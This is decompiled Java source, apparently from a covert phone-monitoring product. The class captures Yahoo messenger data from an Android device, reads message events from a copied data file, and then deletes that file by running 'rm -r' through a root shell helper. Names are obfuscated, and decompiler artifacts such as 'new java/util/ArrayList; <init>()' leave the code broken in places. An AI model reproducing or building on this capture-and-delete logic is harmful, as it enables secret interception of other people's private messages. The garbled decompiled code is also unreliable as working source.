package com.vvt.capture.yahoo.b;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private String c;
  private com.vvt.base.b d;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  private void b()
  {
    String str1 = c.a(this.c);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    Object localObject = c.a();
    if (localObject != null)
    {
      String str1 = c.a(this.c);
      String str2 = this.c;
      String str3 = this.d.f();
      String str4 = c.a((String)localObject, str1, str2, str3);
      bool1 = com.vvt.ag.b.a(str4);
      if (!bool1)
      {
        long l3 = com.vvt.capture.yahoo.c.d(str4);
        bool1 = false;
        localObject = null;
        l2 = l3;
        int j = 0;
        str2 = null;
        for (;;)
        {
          boolean bool3 = l2 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          SystemClock.sleep(6000L);
          long l4 = com.vvt.capture.yahoo.c.d(str4);
          int i = j + 1;
          j = i;
          l2 = l4;
        }
      }
      l2 = l1;
      b();
    }
    for (;;)
    {
      FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
      localFxSimpleEventReference.<init>();
      localObject = Long.valueOf(l2);
      localFxSimpleEventReference.setReference((Long)localObject);
      boolean bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      l2 = l1;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = c.a();
      if (localObject1 != null)
      {
        String str = this.c;
        str = c.a(str);
        Object localObject2 = this.c;
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        localObject1 = c.a((String)localObject1, str, (String)localObject2, (String)localObject3);
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2)
        {
          str = this.c;
          localObject2 = this.d;
          localObject1 = com.vvt.capture.yahoo.c.a(str, (String)localObject1, paramInt, (com.vvt.base.b)localObject2);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    bool3 = a;
    if (bool3) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = c.a();
      if (localObject1 != null)
      {
        String str = this.c;
        str = c.a(str);
        Object localObject2 = this.c;
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str = c.a((String)localObject1, str, (String)localObject2, (String)localObject3);
        bool = com.vvt.ag.b.a(str);
        if (!bool)
        {
          localObject1 = this.c;
          localObject2 = this.d;
          localObject1 = com.vvt.capture.yahoo.c.a((String)localObject1, str, l1, l2, (com.vvt.base.b)localObject2);
          localArrayList.addAll((Collection)localObject1);
        }
        b();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */